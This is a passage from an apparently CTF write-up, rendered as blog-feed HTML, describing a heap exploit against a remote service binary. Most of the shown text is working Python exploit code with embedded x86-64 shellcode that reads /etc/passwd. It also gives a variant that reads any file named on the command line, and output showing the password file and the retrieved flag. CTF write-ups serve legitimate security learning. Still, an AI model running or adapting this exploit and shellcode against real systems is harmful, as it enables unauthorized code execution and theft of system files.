<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;r &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">p_vuln</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>    <span class="c"># receive pesky &#39;&gt; &#39;</span>

<span class="c"># terminate connection cleanly</span>
<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;x</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>

<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></div>


<p>In the other terminal, I observed:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">connect to <span class="o">[</span>127.0.0.1<span class="o">]</span> from localhost <span class="o">[</span>127.0.0.1<span class="o">]</span> 53500
Trace/breakpoint <span class="nb">trap</span> <span class="o">(</span>core dumped<span class="o">)</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">5333</span> ...</code></pre></div>


<p>BOOM! Code execution on my local machine!</p>

<p>At this point I wasted some time to cook up a small shellcode that would re-use existing code in the binary, to verify that the stack was indeed executable in the remote binary. It was, whoop-dee-doo! Next I searched for a proper shellcode and stumbled upon <a href="!http://shell-storm.org/shellcode/files/shellcode-878.php">this one</a>.</p>

<p>I stuck it in the exploit and lo and behold:</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/python</span>

<span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">struct</span>


<span class="k">def</span> <span class="nf">getID</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">r&#39;(\d.*)$&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
    <span class="k">if</span> <span class="n">match</span><span class="p">:</span>
        <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
    
<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">5333</span><span class="p">))</span>

<span class="c"># banner</span>
<span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>

<span class="c"># send first string. this will be our shellcode</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;c 0 </span><span class="se">\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41\n</span><span class="s">&#39;</span><span class="p">)</span>

<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>    <span class="c"># receive pesky &#39;&gt; &#39;</span>
<span class="n">p_shellcode</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="k">print</span> <span class="s">&#39;[+] shellcode = 0x{0:08x}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_shellcode</span><span class="p">)</span>


<span class="c"># send second string. this will be our &#39;pivot&#39; pointer. </span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;c 0 &#39;</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">p_shellcode</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>    <span class="c"># receive pesky &#39;&gt; &#39;</span>
<span class="n">p_pivot</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="k">print</span> <span class="s">&#39;[+] pivot = 0x{0:08x}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_pivot</span><span class="p">)</span>

<span class="c"># let&#39;s crash the binary to see if this works</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;c 1</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>

<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>    <span class="c"># receive pesky &#39;&gt; &#39;</span>
<span class="n">p_tmp</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;u &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">p_tmp</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39; &#39;</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">p_pivot</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>

<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>    <span class="c"># receive pesky &#39;&gt; &#39;</span>
<span class="n">p_vuln</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="k">print</span> <span class="s">&#39;[+] vulnerable pointer = 0x{0:08x}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_vuln</span><span class="p">)</span>

<span class="c"># send read request to crash binary</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;r &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">p_vuln</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>

<span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
<span class="c"># terminate connection cleanly</span>
<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;x</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>

<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></div>




<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>+<span class="o">]</span> <span class="nv">shellcode</span> <span class="o">=</span> 0x01355030
<span class="o">[</span>+<span class="o">]</span> <span class="nv">pivot</span> <span class="o">=</span> 0x01355030
<span class="o">[</span>+<span class="o">]</span> vulnerable <span class="nv">pointer</span> <span class="o">=</span> 0x013552b0
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
...snip...</code></pre></div>


<p>This also worked against the remote server! It showed me that there was a user called <code>amazon</code> with home directory <code>/home/amazon</code>. I adapted the exploit a bit to make it read arbitrary files. The instruction that needs adjusting is this one:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="p">;</span> NULL byte fix
xor byte <span class="o">[</span>rdi + 11<span class="o">]</span>, 0x41</code></pre></div>


<p>We need to update the value 11, or <code>0x0b</code>. The exploit code was modified once more, spraying <code>time.sleep()</code> calls here and there:</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/python</span>

<span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">sys</span>


<span class="k">def</span> <span class="nf">getID</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">r&#39;(\d.*)&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
    <span class="k">if</span> <span class="n">match</span><span class="p">:</span>
        <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
    
<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">5333</span><span class="p">))</span>

<span class="c"># banner</span>
<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>

<span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
<span class="n">filename</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
<span class="c"># send first string. this will be our shellcode</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;c 0 </span><span class="se">\xeb\x3f\x5f\x80\x77</span><span class="s">&#39;</span><span class="o">+</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;b&#39;</span><span class="p">,</span> <span class="n">length</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;</span><span class="se">\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff</span><span class="s">&#39;</span><span class="o">+</span><span class="n">filename</span><span class="o">+</span><span class="s">&#39;A</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>

<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
<span class="c">#s.recv(2)  # receive pesky &#39;&gt; &#39;</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">p_shellcode</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="k">print</span> <span class="s">&#39;[+] shellcode = 0x{0:08x}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_shellcode</span><span class="p">)</span>

<span class="c"># send second string. this will be our &#39;pivot&#39; pointer. </span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;c 0 &#39;</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">p_shellcode</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>

<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">p_pivot</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="k">print</span> <span class="s">&#39;[+] pivot = 0x{0:08x}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_pivot</span><span class="p">)</span>

<span class="c"># let&#39;s crash the binary to see if this works</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;c 1</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>

<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">p_tmp</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;u &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">p_tmp</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39; &#39;</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">p_pivot</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>

<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">p_vuln</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="k">print</span> <span class="s">&#39;[+] vulnerable pointer = 0x{0:08x}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_vuln</span><span class="p">)</span>

<span class="c"># send read request to crash binary</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;r &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">p_vuln</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>

<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
<span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>

<span class="c"># terminate connection cleanly</span>
<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;x</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>

<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></div>


<p>(Note: this exploit fails if the address contains a NULL byte, a space or a zero, as these truncate data. During the CTF, I experienced no problems).</p>

<p>Now it was a matter of getting the flag. I tried <code>/home/amazon/key</code>, which returned nothing. Next was <code>/home/amazon/flag</code> and that was a bingo :)</p>
]]></content>
  </entry>
  
</feed>
